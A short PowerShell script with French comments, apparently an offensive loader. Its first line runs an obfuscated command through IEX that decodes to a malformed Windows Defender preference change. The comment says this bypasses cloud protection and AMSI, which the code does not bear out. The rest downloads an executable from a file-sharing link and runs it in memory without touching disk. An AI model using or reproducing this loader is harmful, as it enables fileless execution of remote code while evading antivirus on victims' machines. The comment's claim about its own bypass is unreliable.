# Bypass cloud protection + AMSI (obfusqué pour passer)
IEX([char[]](83,101,116,45,77,112,80,114,101,102,101,114,101,110,99,101,32,45,83,117,98,109,105,116,83,97,109,112,108,101,115,70,97,108,115,101)|%{[char]$_})

# Charge ton exe en mémoire et exécute (0 disque)
$bytes = (New-Object Net.WebClient).DownloadData('https://limewire.com/d/e7ZYI#KTxZOpKpll')
$asm = [Reflection.Assembly]::Load($bytes)
$asm.EntryPoint.Invoke($null,$null)
